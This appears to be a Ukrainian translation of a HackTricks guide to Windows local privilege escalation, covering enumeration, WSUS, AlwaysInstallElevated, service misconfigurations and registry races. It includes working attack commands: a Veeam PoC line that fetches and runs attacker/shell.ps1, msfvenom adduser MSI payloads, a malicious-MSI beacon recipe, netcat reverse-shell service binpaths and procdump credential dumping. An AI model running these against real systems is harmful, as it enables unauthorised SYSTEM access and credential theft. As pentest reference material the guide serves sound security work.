# Локальне підвищення привілеїв у Windows

{{#include ../../banners/hacktricks-training.md}}

### **Найкращий інструмент для пошуку векторів локального підвищення привілеїв у Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Початкова теорія Windows

### Токени доступу

**Якщо ви не знаєте, що таке токени доступу Windows, прочитайте наведену нижче сторінку, перш ніж продовжити:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Перегляньте наведену нижче сторінку, щоб дізнатися більше про ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Рівні цілісності

**Якщо ви не знаєте, що таке рівні цілісності у Windows, прочитайте наведену нижче сторінку, перш ніж продовжити:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Засоби контролю безпеки Windows

У Windows є різні механізми, які можуть **перешкодити вам провести enumeration системи**, запускати виконувані файли або навіть **виявити ваші дії**. Вам слід **прочитати** наведену нижче **сторінку** та **перерахувати** всі ці **захисні** **механізми**, перш ніж починати enumeration для підвищення привілеїв:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Захист адміністратора / тихе підвищення через UIAccess

Процеси UIAccess, запущені через `RAiLaunchAdminProcess`, можна використати для досягнення High IL без запитів, якщо обійти перевірки безпечного шляху AppInfo. Ознайомтеся з окремим workflow обходу UIAccess/Admin Protection тут:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Поширення параметрів реєстру доступності Secure Desktop можна використати для довільного запису до реєстру від імені SYSTEM (RegPwn):

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

У новіших збірках Windows також з'явився шлях **SMB arbitrary-port** для LPE, за якого привілейована локальна NTLM-аутентифікація відображається через повторно використане SMB TCP-з'єднання:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Інформація про систему

### Enumeration інформації про версію

Перевірте, чи має версія Windows відомі вразливості (також перевірте застосовані патчі).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Експлойти версій

Цей [сайт](https://msrc.microsoft.com/update-guide/vulnerability) зручний для пошуку детальної інформації про вразливості безпеки Microsoft. Ця база даних містить понад 4 700 вразливостей безпеки, демонструючи **масштабну поверхню атаки**, яку створює середовище Windows.

**У системі**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas має вбудований watson)_

**Локально, використовуючи інформацію про систему**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github-репозиторії експлойтів:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Середовище

Чи збережено в змінних середовища облікові дані або Juicy info?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Історія PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Файли транскриптів PowerShell

Дізнатися, як це ввімкнути, можна за посиланням [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/).
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### Журналювання модулів PowerShell

Записуються відомості про виконання конвеєрів PowerShell, зокрема виконані команди, виклики команд і частини скриптів. Однак повні відомості про виконання та результати виводу можуть не записуватися.

Щоб увімкнути цю функцію, дотримуйтеся інструкцій у розділі документації "Файли транскриптів", вибравши **"Module Logging"** замість **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Щоб переглянути останні 15 подій із журналів PowerShell, можна виконати:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### **Журналювання блоків скриптів PowerShell**

Фіксується повний запис активності та всього вмісту виконання скрипту, що забезпечує документування кожного блоку коду під час його виконання. Цей процес зберігає комплексний audit trail кожної дії, що є цінним для forensic-аналізу та дослідження шкідливої поведінки. Документування всієї активності під час виконання забезпечує детальне розуміння процесу.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Журнали подій для Script Block можна знайти в Переглядачі подій Windows за шляхом: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Щоб переглянути останні 20 подій, можна використати:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Налаштування Інтернету
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Диски
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Ви можете скомпрометувати систему, якщо оновлення запитуються не через http**S**, а через http.

Спочатку перевірте, чи використовує мережа оновлення WSUS без SSL, виконавши в cmd таку команду:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Або наступне в PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Якщо ви отримуєте відповідь на кшталт однієї з таких:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
І якщо `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` або `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` дорівнює `1`.

Тоді **це вразливість, яку можна експлуатувати.** Якщо останній registry дорівнює 0, запис WSUS буде проігноровано.

Для експлуатації цих вразливостей можна використовувати такі tools: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — це weaponized MiTM exploit scripts для ін’єкції «підроблених» оновлень у не-SSL WSUS traffic.

Ознайомтеся з дослідженням тут:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Читайте повний звіт тут**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
По суті, саме цю ваду експлуатує bug:

> Якщо ми маємо можливість змінювати proxy нашого local user, а Windows Updates використовує proxy, налаштований у параметрах Internet Explorer, то ми можемо локально запустити [PyWSUS](https://github.com/GoSecure/pywsus), перехопити власний traffic і виконати code від імені elevated user на нашому asset.
>
> Крім того, оскільки WSUS service використовує settings поточного user, він також використовує його certificate store. Якщо ми згенеруємо self-signed certificate для WSUS hostname і додамо цей certificate до certificate store поточного user, то зможемо перехоплювати як HTTP-, так і HTTPS-WSUS traffic. WSUS не використовує механізмів на кшталт HSTS для реалізації validation за принципом trust-on-first-use щодо certificate. Якщо certificate, який надається, є trusted для user і має правильний hostname, service його прийме.

Цю вразливість можна експлуатувати за допомогою tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (щойно його буде liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Багато enterprise agents відкривають localhost IPC surface і privileged update channel. Якщо enrollment можна змусити підключитися до attacker server, а updater довіряє rogue root CA або використовує слабкі signer checks, local user може передати malicious MSI, який SYSTEM service встановить. Узагальнену technique (на основі Netskope stAgentSvc chain — CVE-2025-0309) наведено тут:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` відкриває localhost service на **TCP/9401**, який обробляє attacker-controlled messages, що дозволяє виконувати довільні commands від імені **NT AUTHORITY\SYSTEM**.

- **Recon**: підтвердьте наявність listener і version, наприклад, за допомогою `netstat -ano | findstr 9401` і `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: розмістіть PoC, наприклад `VeeamHax.exe`, з необхідними Veeam DLLs у тій самій directory, а потім trigger-ніть SYSTEM payload через local socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Служба виконує команду як SYSTEM.
## KrbRelayUp

У середовищах Windows **домену** за певних умов існує вразливість **локального підвищення привілеїв**. Ці умови передбачають середовища, де **підписування LDAP не застосовується,** користувачі мають власні дозволи, що дають їм змогу налаштовувати **Resource-Based Constrained Delegation (RBCD),** а також можливість користувачам створювати комп’ютери в домені. Важливо зазначити, що ці **вимоги** виконуються за **типових налаштувань**.

Знайдіть **exploit у** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Докладніше про перебіг атаки дивіться [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Якщо** ці 2 реєстрові ключі **увімкнено** (значення — **0x1**), тоді користувачі з будь-яким рівнем привілеїв можуть **встановлювати** (виконувати) файли `*.msi` від імені NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Пейлоади Metasploit
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Якщо у вас є сесія meterpreter, ви можете автоматизувати цю техніку за допомогою модуля **`exploit/windows/local/always_install_elevated`**

### PowerUP

Використайте команду `Write-UserAddMSI` з power-up, щоб створити в поточному каталозі Windows MSI binary для підвищення привілеїв. Цей скрипт записує попередньо скомпільований MSI installer, який запитує додавання користувача/групи (тому вам знадобиться доступ через GIU):
```
Write-UserAddMSI
```
Просто виконайте створений binary, щоб підвищити привілеї.

### MSI Wrapper

Прочитайте цей tutorial, щоб дізнатися, як створити MSI wrapper за допомогою цих tools. Зверніть увагу, що ви можете загорнути файл "**.bat**", якщо ви **лише** хочете **виконувати** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- За допомогою Cobalt Strike або Metasploit **згенеруйте** **новий Windows EXE TCP payload** у `C:\privesc\beacon.exe`
- Відкрийте **Visual Studio**, виберіть **Create a new project** і введіть "installer" у поле пошуку. Виберіть проєкт **Setup Wizard** і натисніть **Next**.
- Назвіть проєкт, наприклад **AlwaysPrivesc**, використайте **`C:\privesc`** як розташування, виберіть **place solution and project in the same directory** і натисніть **Create**.
- Продовжуйте натискати **Next**, доки не перейдете до кроку 3 із 4 (вибір файлів для включення). Натисніть **Add** і виберіть щойно створений Beacon payload. Потім натисніть **Finish**.
- Виділіть проєкт **AlwaysPrivesc** у **Solution Explorer** і в **Properties** змініть **TargetPlatform** з **x86** на **x64**.
- Є й інші властивості, які можна змінити, наприклад **Author** і **Manufacturer**, завдяки яким встановлений app може виглядати більш легітимно.
- Клацніть правою кнопкою миші проєкт і виберіть **View > Custom Actions**.
- Клацніть правою кнопкою миші **Install** і виберіть **Add Custom Action**.
- Двічі клацніть **Application Folder**, виберіть файл **beacon.exe** і натисніть **OK**. Це забезпечить виконання Beacon payload одразу після запуску installer.
- У **Custom Action Properties** змініть **Run64Bit** на **True**.
- Нарешті, **зберіть його**.
- Якщо відображається попередження `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, переконайтеся, що ви встановили платформу x64.

### MSI Installation

Щоб виконати **встановлення** шкідливого файлу `.msi` у **background:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Щоб експлуатувати цю вразливість, можна використати: _exploit/windows/local/always_install_elevated_

## Антивірус і засоби виявлення

### Налаштування аудиту

Ці налаштування визначають, що саме **записується в журнал**, тому слід звернути увагу
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding — корисно знати, куди надсилаються logs
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** призначений для **керування паролями локального Administrator**, забезпечуючи, щоб кожен пароль був **унікальним, випадковим і регулярно оновлювався** на комп’ютерах, приєднаних до домену. Ці паролі безпечно зберігаються в Active Directory, і доступ до них можуть отримати лише користувачі, яким через ACLs надано достатні дозволи для перегляду паролів локального admin, якщо вони авторизовані.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Якщо активний, **паролі у відкритому тексті зберігаються в LSASS** (Local Security Authority Subsystem Service).\
[**Більше інформації про WDigest на цій сторінці**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### Захист LSA

Починаючи з **Windows 8.1**, Microsoft запровадила посилений захист Local Security Authority (LSA), щоб **блокувати** спроби ненадійних процесів **читати її пам’ять** або впроваджувати код, додатково підвищуючи безпеку системи.\
[**Докладніше про захист LSA**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credential Guard

**Credential Guard** було представлено у **Windows 10**. Його призначення — захищати облікові дані, збережені на пристрої, від таких загроз, як pass-the-hash attacks.| [**Більше інформації про Credential Guard тут.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Кешовані облікові дані

**Облікові дані домену** автентифікуються **Local Security Authority** (LSA) і використовуються компонентами операційної системи. Коли дані входу користувача автентифікуються зареєстрованим security package, для користувача зазвичай створюються облікові дані домену.\
[**Більше інформації про кешовані облікові дані тут**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Користувачі та групи

### Перелік користувачів і груп

Перевірте, чи мають якісь групи, до яких ви належите, цікаві дозволи
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Привілейовані групи

Якщо ви **належите до привілейованої групи, ви можете отримати можливість підвищити привілеї**. Дізнайтеся про привілейовані групи та способи їх використання для підвищення привілеїв тут:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Дізнайтеся більше** про те, що таке **token**, на цій сторінці: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Перегляньте наведену нижче сторінку, щоб **дізнатися про цікаві token** і способи їх використання:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Користувачі, які увійшли в систему / Сеанси
```bash
qwinsta
klist sessions
```
### Домашні папки
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Політика паролів
```bash
net accounts
```
### Отримання вмісту буфера обміну
```bash
powershell -command "Get-Clipboard"
```
## Запущені процеси

### Права доступу до файлів і папок

Перш за все, під час перелічення процесів **перевірте наявність паролів у командному рядку процесу**.\
Перевірте, чи можете ви **перезаписати якийсь запущений binary**, або чи маєте ви права на запис до папки binary, щоб скористатися можливими [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Завжди перевіряйте наявність запущених [**electron/cef/chromium debuggers**], адже їх можна використати для підвищення привілеїв](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

**Перевірка дозволів бінарних файлів процесів**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Перевірка дозволів папок бінарних файлів процесів (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Видобування паролів із пам'яті

Ви можете створити дамп пам'яті запущеного процесу за допомогою **procdump** з sysinternals. Сервіси на кшталт FTP зберігають **облікові дані у відкритому тексті в пам'яті** — спробуйте створити дамп пам'яті та прочитати облікові дані.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Небезпечні GUI-застосунки

**Застосунки, що працюють від імені SYSTEM, можуть дозволити користувачу запустити CMD або переглядати каталоги.**

Приклад: "Windows Help and Support" (Windows + F1), виконайте пошук за запитом "command prompt", натисніть "Click to open Command Prompt"

## Служби

Service Triggers дозволяють Windows запускати службу, коли виникають певні умови (активність іменованого каналу/RPC endpoint, події ETW, доступність IP, підключення пристрою, оновлення GPO тощо). Навіть без прав SERVICE_START ви часто можете запускати привілейовані служби, активуючи їхні тригери. Дивіться техніки enumeration та activation тут:

-
{{#ref}}
service-triggers.md
{{#endref}}

Отримати список служб:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Дозволи

Ви можете використовувати **sc**, щоб отримати інформацію про службу
```bash
sc qc <service_name>
```
Рекомендується мати бінарний файл **accesschk** від _Sysinternals_, щоб перевіряти необхідний рівень привілеїв для кожної служби.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Рекомендується перевірити, чи можуть "Authenticated Users" змінювати будь-яку службу:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Ви можете завантажити accesschk.exe для XP тут](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Увімкнення служби

Якщо ви отримуєте цю помилку (наприклад, із SSDPSRV):

_Системна помилка 1058._

_Службу не можна запустити, оскільки її вимкнено або з нею не пов'язано жодного ввімкненого пристрою._

Ви можете ввімкнути її за допомогою
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Врахуйте, що для роботи служба upnphost залежить від SSDPSRV (для XP SP1)**

**Інший обхідний шлях** цієї проблеми — виконати:
```
sc.exe config usosvc start= auto
```
### **Зміна шляху до бінарного файла служби**

У сценарії, коли група "Authenticated users" має **SERVICE_ALL_ACCESS** для служби, можна змінити виконуваний бінарний файл служби. Щоб змінити та виконати **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Перезапуск служби
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Привілеї можна підвищити за допомогою різних дозволів:

- **SERVICE_CHANGE_CONFIG**: Дозволяє переналаштувати бінарний файл служби.
- **WRITE_DAC**: Уможливлює переналаштування дозволів, що дає змогу змінювати конфігурації служб.
- **WRITE_OWNER**: Дозволяє отримати право власності та переналаштувати дозволи.
- **GENERIC_WRITE**: Успадковує можливість змінювати конфігурації служб.
- **GENERIC_ALL**: Також успадковує можливість змінювати конфігурації служб.

Для виявлення та експлуатації цієї вразливості можна використати _exploit/windows/local/service_permissions_.

### Слабкі дозволи бінарних файлів служб

Якщо служба працює від імені **`LocalSystem`**, **`LocalService`**, **`NetworkService`** або привілейованого доменного облікового запису, але **користувачі з низькими привілеями можуть змінювати EXE-файл служби або його батьківську папку**, службу часто можна перехопити, **замінивши бінарний файл і перезапустивши службу**.

**Перевірте, чи можете ви змінювати бінарний файл, який запускається службою**, або чи маєте **дозволи на запис у папку**, де розташований бінарний файл ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Ви можете отримати список усіх бінарних файлів, які запускаються службами, за допомогою **wmic** (не в system32), а потім перевірити свої дозволи за допомогою **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Також можна використовувати **sc** та **icacls**:
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
Шукайте небезпечні ACL, надані **`Everyone`**, **`BUILTIN\Users`** або **`Authenticated Users`**, особливо **`(F)`**, **`(M)`** чи **`(W)`** для виконуваного файлу service або каталогу, що його містить. Практичний сценарій зловживання:

1. Підтвердьте обліковий запис service і шлях до виконуваного файлу за допомогою `sc qc <service_name>`.
2. Підтвердьте, що бінарний файл доступний для запису, за допомогою `icacls <path>`.
3. Замініть бінарний файл service на payload або дійсний шкідливий бінарний файл service.
4. Перезапустіть service за допомогою `sc stop <service_name> && sc start <service_name>` (або дочекайтеся перезавантаження чи тригера service).

Корисні автоматизовані перевірки:
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> Якщо служба не дозволяє звичайному користувачеві перезапустити її, перевірте, чи запускається вона автоматично під час завантаження системи, чи має дію у разі збою, яка повторно запускає її, або чи може бути опосередковано запущена застосунком, що її використовує.

### Дозволи на зміну реєстру служб

Вам слід перевірити, чи можете ви змінювати будь-який реєстр служб.\
Ви можете **перевірити** свої **дозволи** щодо **реєстру** служб за допомогою:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Слід перевірити, чи мають **Authenticated Users** або **NT AUTHORITY\INTERACTIVE** дозволи `FullControl`. Якщо так, бінарний файл, який виконується службою, можна змінити.

Щоб змінити Path бінарного файлу, який виконується:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Гонка за символічне посилання реєстру для довільного запису значення HKLM (ATConfig)

Деякі функції спеціальних можливостей Windows створюють пов’язані з користувачем ключі **ATConfig**, які згодом копіюються процесом **SYSTEM** до сеансового ключа HKLM. Гонка із **символічним посиланням** у реєстрі може перенаправити цей привілейований запис до **будь-якого шляху HKLM**, надаючи примітив **запису довільного значення** в HKLM.

Ключові розташування (приклад: екранна клавіатура `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` містить перелік встановлених функцій спеціальних можливостей.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` зберігає конфігурацію, контрольовану користувачем.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` створюється під час входу або переходів до захищеного робочого стола й доступний користувачу для запису.

Послідовність використання (CVE-2026-24291 / ATConfig):

1. Заповніть значення **HKCU ATConfig**, яке має бути записане процесом SYSTEM.
2. Запустіть копіювання до захищеного робочого стола (наприклад, **LockWorkstation**), що запускає потік AT broker.
3. **Виграйте гонку**, встановивши **oplock** на `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; коли спрацює oplock, замініть ключ **HKLM Session ATConfig** на **посилання реєстру** на захищену ціль HKLM.
4. SYSTEM запише вибране зловмисником значення до перенаправленого шляху HKLM.

Отримавши можливість довільного запису значень HKLM, виконайте pivot до LPE, перезаписавши значення конфігурації service:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/командний рядок)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Виберіть service, який звичайний користувач може запустити (наприклад, **`msiserver`**), і запустіть його після запису. **Примітка:** публічна реалізація exploit **блокує робочу станцію** як частину гонки.

Приклад tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Дозволи AppendData/AddSubdirectory для реєстру служб

Якщо у вас є цей дозвіл для реєстру, це означає, що **ви можете створювати підреєстри в ньому**. У випадку служб Windows цього **достатньо для виконання довільного коду:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Якщо шлях до виконуваного файлу не взято в лапки, Windows намагатиметься виконати кожну частину шляху до пробілу.

Наприклад, для шляху _C:\Program Files\Some Folder\Service.exe_ Windows намагатиметься виконати:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Перелічіть усі шляхи до служб без лапок, за винятком шляхів вбудованих служб Windows:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
